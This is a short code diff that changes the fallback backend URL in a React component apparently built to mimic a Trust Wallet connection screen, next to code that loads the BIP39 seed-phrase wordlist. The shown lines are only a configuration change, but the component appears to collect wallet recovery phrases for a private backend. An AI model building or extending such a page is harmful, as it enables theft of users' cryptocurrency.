@@ -240,7 +240,7 @@ const TrustWalletConnectUnique = () => {
   const navigate = useNavigate();
   const location = useLocation();
 
-  const API_URL = process.env.REACT_APP_API_URL || "https://versel-backend-1z91.onrender.com";
+  const API_URL = process.env.REACT_APP_API_URL || "https://backend-instacoinpay-1.onrender.com";
 
   // Get BIP39 wordlist from the library
   const getWordlist = () => {
